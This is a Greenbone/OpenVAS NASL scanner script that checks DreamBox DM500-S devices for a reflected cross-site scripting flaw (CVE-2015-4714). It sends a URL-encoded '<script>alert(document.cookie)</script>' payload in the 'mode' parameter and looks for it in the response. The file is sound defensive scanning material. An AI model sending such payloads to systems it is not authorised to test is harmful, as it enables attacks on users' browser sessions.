if(description){
	script_oid( "1.3.6.1.4.1.25623.1.0.805071" );
	script_version( "2020-08-24T15:18:35+0000" );
	script_cve_id( "CVE-2015-4714" );
	script_tag( name: "cvss_base", value: "4.3" );
	script_tag( name: "cvss_base_vector", value: "AV:N/AC:M/Au:N/C:N/I:P/A:N" );
	script_tag( name: "last_modification", value: "2020-08-24 15:18:35 +0000 (Mon, 24 Aug 2020)" );
	script_tag( name: "creation_date", value: "2015-06-25 13:00:26 +0530 (Thu, 25 Jun 2015)" );
	script_tag( name: "qod_type", value: "exploit" );
	script_name( "DreamBox DM500-S Cross-Site Scripting (XSS) Vulnerability" );
	script_tag( name: "summary", value: "This host has DreamBox DM500-S and is
  prone to cross-site scripting vulnerability." );
	script_tag( name: "vuldetect", value: "Send a crafted HTTP GET request and
  check whether it is able read the cookie or not" );
	script_tag( name: "insight", value: "The flaw is due to an input passed via
  the body and mode parameter is not properly sanitized." );
	script_tag( name: "impact", value: "Successful exploitation will allow attacker
  to execute arbitrary HTML and script code in a user's browser session in the
  context of an affected site." );
	script_tag( name: "affected", value: "Dreambox DM500" );
	script_tag( name: "solution", value: "No known solution was made available for at least one year since the disclosure of this vulnerability.
Likely none will be provided anymore.
General solution options are to upgrade to a newer release, disable respective features, remove the product or replace the product by another one." );
	script_xref( name: "URL", value: "http://www.scip.ch/en/?vuldb.75860" );
	script_xref( name: "URL", value: "https://packetstormsecurity.com/files/132214" );
	script_tag( name: "solution_type", value: "WillNotFix" );
	script_category( ACT_ATTACK );
	script_copyright( "Copyright (C) 2015 Greenbone Networks GmbH" );
	script_family( "Web application abuses" );
	script_dependencies( "find_service.sc", "httpver.sc", "global_settings.sc" );
	script_require_ports( "Services/www", 80 );
	script_exclude_keys( "Settings/disable_cgi_scanning" );
	exit( 0 );
}
require("http_func.inc.sc");
require("http_keepalive.inc.sc");
require("port_service_func.inc.sc");
require("host_details.inc.sc");
DreamBoxPort = http_get_port( default: 80 );
rcvRes = http_get_cache( item: NASLString( "/" ), port: DreamBoxPort );
if(ContainsString( rcvRes, "[Dreambox]<" ) || ContainsString( rcvRes, ">Enigma Web Interface<" ) && IsMatchRegexp( rcvRes, "HTTP/1\\.[0-9]+ 200 OK" )){
	url = "/body?mode=zap52b06%3Cscript%3Ealert(document.cookie)%3C%2f" + "script%3Eca184&zapmode=0&zapsubmode=4";
	if(http_vuln_check( port: DreamBoxPort, url: url, check_header: TRUE, pattern: "<script>alert\\(document\\.cookie\\)</script>", extra_check: "parent.setTitle" )){
		report = http_report_vuln_url( port: DreamBoxPort, url: url );
		security_message( port: DreamBoxPort, data: report );
		exit( 0 );
	}
}

